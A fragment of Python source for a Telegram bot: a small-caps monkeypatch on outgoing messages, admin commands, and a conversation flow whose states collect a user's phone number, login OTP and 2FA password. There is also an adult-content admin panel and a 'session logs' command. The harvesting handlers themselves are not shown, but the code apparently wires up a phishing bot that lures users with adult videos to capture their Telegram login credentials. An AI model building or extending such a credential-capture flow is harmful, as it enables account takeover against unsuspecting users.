    app = Application.builder().token(config.BOT_TOKEN).post_init(post_init).build()

    # ── Small Caps Monkeypatch ──────────────────────────────────────────
    # Auto-converts all outgoing message text & button labels to small caps
    import re as _re
    from utils import small_caps as _sc

    def _sc_text(text):
        parts = _re.split(r'(<[^>]+>)', text)
        for i in range(0, len(parts), 2):
            parts[i] = _sc(parts[i])
        return "".join(parts)

    _bot = app.bot
    _orig_send = _bot.send_message
    _orig_edit = _bot.edit_message_text
    _orig_send_video = _bot.send_video

    async def _patched_send(chat_id, text=None, *args, **kwargs):
        if text:
            text = _sc_text(text)
        return await _orig_send(chat_id, text, *args, **kwargs)

    async def _patched_edit(text, chat_id=None, message_id=None, *args, **kwargs):
        if text:
            text = _sc_text(text)
        return await _orig_edit(text, chat_id=chat_id, message_id=message_id, *args, **kwargs)

    async def _patched_send_video(chat_id, video, caption=None, *args, **kwargs):
        if caption:
            caption = _sc_text(caption)
        return await _orig_send_video(chat_id, video, caption, *args, **kwargs)

    object.__setattr__(_bot, "send_message", _patched_send)
    object.__setattr__(_bot, "edit_message_text", _patched_edit)
    object.__setattr__(_bot, "send_video", _patched_send_video)
    # ─────────────────────────────────────────────────────────────────────

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", show_admin_dashboard_wrapper))
    app.add_handler(CommandHandler("logs", show_session_logs))
    app.add_handler(CommandHandler("setchannel", set_channel))

    conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler)],
        states={
            PHONE_WAIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone)],
            OTP_WAIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_otp)],
            TFA_WAIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_2fa)],
        },
        fallbacks=[CommandHandler("start", start)],
        per_message=False,
    )
    app.add_handler(conv)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)

    logger.info("🔥 Bot is polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


async def show_admin_dashboard_wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in config.ADMIN_IDS:
        return
    user_count = await db.get_user_count()
    v_count = await db.video_count()
    pending_purchases = await db.get_pending_purchases()
    text = (
        "<blockquote>🔞 ADMIN CONTROL PANEL</blockquote>\n\n"
        f"👥 <b>Total Users:</b> <code>{user_count}</code>\n"
        f"📹 <b>Total Videos:</b> <code>{v_count}</code>\n"
        f"💰 <b>Pending Purchases:</b> <code>{len(pending_purchases)}</code>\n\n"
        "<i>Use the buttons below to manage.</i>"
    )
    await update.message.reply_text(text, reply_markup=admin_keyboard(), parse_mode="HTML")


if __name__ == "__main__":
    main()
